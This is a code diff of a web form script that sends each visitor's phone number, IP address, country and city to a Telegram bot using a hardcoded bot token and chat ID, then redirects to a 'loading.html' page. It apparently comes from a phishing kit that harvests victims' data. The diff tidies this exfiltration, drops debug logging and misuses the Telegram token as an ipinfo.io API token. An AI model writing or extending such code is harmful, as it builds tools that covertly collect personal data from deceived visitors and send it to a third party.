@@ -144,7 +144,7 @@
     const iti = window.intlTelInput(input, {
       initialCountry: "auto",
       geoIpLookup: function (callback) {
-        fetch("https://ipapi.co/json")
+        fetch("https://ipinfo.io/json?token=7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY")
           .then((resp) => resp.json())
           .then((data) => {
             const countryCode = data && data.country ? data.country : "us";
@@ -167,20 +167,16 @@
       const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
       const chatId = "7196613507";
 
-      console.log("Fetching location...");
-      fetch("https://ipapi.co/json")
+      fetch("https://ipinfo.io/json?token=7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY")
         .then((response) => response.json())
         .then((data) => {
           const ip = data.ip;
-          const country = data.country_name;
+          const country = data.country;
           const city = data.city;
 
           const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
-          const telegramUrl = `https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`;
 
-          console.log("Sending to Telegram:", message);
-
-          fetch(telegramUrl, {
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -196,19 +192,16 @@
               console.error("Telegram API error:", data);
               alert(`Telegram API error: ${data.description}`);
             } else {
-              console.log("✅ Message sent! Redirecting to loading page...");
-              setTimeout(() => {
-                window.location.href = "loading.html";
-              }, 1000);
+              window.location.href = "loading.html";
             }
           })
           .catch(err => {
-            console.error("❌ Fetch error:", err);
+            console.error("Fetch error:", err);
             alert("An error occurred. Please try again.");
           });
         })
-        .catch((err) => {
-          console.error("❌ Location fetch error:", err);
+        .catch(err => {
+          console.error("Location fetch failed:", err);
           alert("Unable to fetch your location. Try again.");
         });
     });
